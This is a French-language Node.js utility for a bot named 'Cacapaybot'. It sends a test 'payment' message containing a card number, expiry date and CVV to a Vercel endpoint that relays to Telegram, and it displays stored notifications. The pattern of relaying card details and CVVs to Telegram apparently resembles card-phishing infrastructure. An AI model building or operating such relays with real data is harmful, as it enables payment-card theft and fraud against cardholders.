const fetch = require('node-fetch');

console.log('📱 AFFICHAGE SIMPLE DES MESSAGES');
console.log('================================');

const CONFIG = {
    VERCEL_API_URL: 'https://test-alpha-lac-68.vercel.app/api/notifications',
    TELEGRAM_API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram',
    LOG_FILE: 'simple_messages.txt'
};

// Fonction pour envoyer un message de test
async function sendTestMessage() {
    try {
        console.log('🧪 Envoi d\'un message de test...');
        
        const testMessage = `💰 MESSAGE DE TEST SIMPLE !
👤 Nom: Test Simple
📧 Email: test@simple.com
💳 Carte: 1234 **** **** 5678
📅 Expiration: 12/25
🔐 CVV: 123
💶 Montant: 99.99€
🔒 Vérifiez immédiatement !`;

        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: testMessage,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Message de test envoyé !');
            console.log('📱 Message ID:', result.telegramResponse?.result?.message_id);
            
            // Afficher le message immédiatement
            const messageObj = {
                id: result.telegramResponse?.result?.message_id || Date.now(),
                message: testMessage,
                timestamp: new Date().toISOString(),
                sender: 'Cacapaybot',
                type: 'payment_message'
            };
            
            displayMessage(messageObj);
            saveMessageToFile(messageObj);
            
            return true;
        }
        
        return false;
    } catch (error) {
        console.error('❌ Erreur envoi message test:', error);
        return false;
    }
}

// Fonction pour afficher le message
function displayMessage(message) {
    console.log('\n' + '='.repeat(60));
    console.log('📱 MESSAGE CACAPAYBOT');
    console.log('='.repeat(60));
    console.log(`🆔 ID: ${message.id}`);
    console.log(`📅 Date: ${new Date(message.timestamp).toLocaleString()}`);
    console.log(`👤 Expéditeur: ${message.sender}`);
    console.log(`📝 Type: ${message.type}`);
    console.log('\n📄 CONTENU:');
    console.log('-'.repeat(40));
    console.log(message.message);
    console.log('-'.repeat(40));
    console.log('='.repeat(60));
}

// Fonction pour sauvegarder le message dans un fichier
function saveMessageToFile(message) {
    const fs = require('fs');
    const content = `
=== MESSAGE CACAPAYBOT ===
ID: ${message.id}
Date: ${new Date(message.timestamp).toLocaleString()}
Expéditeur: ${message.sender}
Type: ${message.type}

CONTENU:
${message.message}
=== FIN DU MESSAGE ===
`;
    
    try {
        fs.writeFileSync(CONFIG.LOG_FILE, content);
        console.log(`💾 Message sauvegardé dans: ${CONFIG.LOG_FILE}`);
    } catch (error) {
        console.error('❌ Erreur sauvegarde:', error);
    }
}

// Fonction pour récupérer les messages depuis Vercel
async function getMessages() {
    try {
        console.log('🔍 Récupération des messages depuis Vercel...');
        const response = await fetch(CONFIG.VERCEL_API_URL);
        const data = await response.json();
        
        if (data.success && data.notifications && data.notifications.length > 0) {
            console.log(`📨 ${data.notifications.length} notifications trouvées`);
            return data.notifications.reverse(); // Plus récents en premier
        }
        return [];
    } catch (error) {
        console.error('❌ Erreur récupération messages:', error);
        return [];
    }
}

// Fonction principale
async function main() {
    const args = process.argv.slice(2);
    
    if (args.includes('--test')) {
        // Mode test - envoyer un message et l'afficher
        console.log('🧪 MODE TEST - Envoi et affichage d\'un message');
        const sent = await sendTestMessage();
        
        if (sent) {
            console.log('✅ Message envoyé et affiché !');
        }
    } else if (args.includes('--show')) {
        // Mode affichage - récupérer et afficher les messages
        const messages = await getMessages();
        
        if (messages.length > 0) {
            const lastMessage = messages[0];
            displayMessage(lastMessage);
            saveMessageToFile(lastMessage);
        } else {
            console.log('📭 Aucun message trouvé');
            console.log('💡 Utilisez --test pour envoyer un message de test');
        }
    } else {
        // Mode par défaut - afficher l'aide
        console.log('💡 Commandes disponibles :');
        console.log('  --test : Envoyer un message de test et l\'afficher');
        console.log('  --show : Afficher le dernier message reçu');
        console.log('');
        console.log('Exemples :');
        console.log('  node simple_message_display.js --test');
        console.log('  node simple_message_display.js --show');
    }
}

// Exécuter
main().catch(console.error);
